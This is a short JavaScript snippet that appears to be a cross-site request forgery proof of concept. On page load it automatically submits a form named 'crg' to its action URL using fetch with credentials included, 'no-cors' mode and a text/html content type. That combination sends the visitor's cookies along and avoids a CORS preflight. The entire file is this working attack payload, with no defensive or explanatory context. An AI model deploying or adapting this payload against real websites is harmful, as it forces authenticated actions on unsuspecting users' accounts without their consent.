window.onload = function() {
    setTimeout(autoSend, 10)
};

function autoSend(){
    let
        oldForm = document.forms.crg,
        formData = new FormData(oldForm),
        url = oldForm.getAttribute('action'),
        method = oldForm.getAttribute('method')
        ;
    fetch(url, {
        method: method,
        body: formData,
        mode: 'no-cors',
        credentials: 'include',
        headers: {'Content-Type': 'text/html'},
    });
};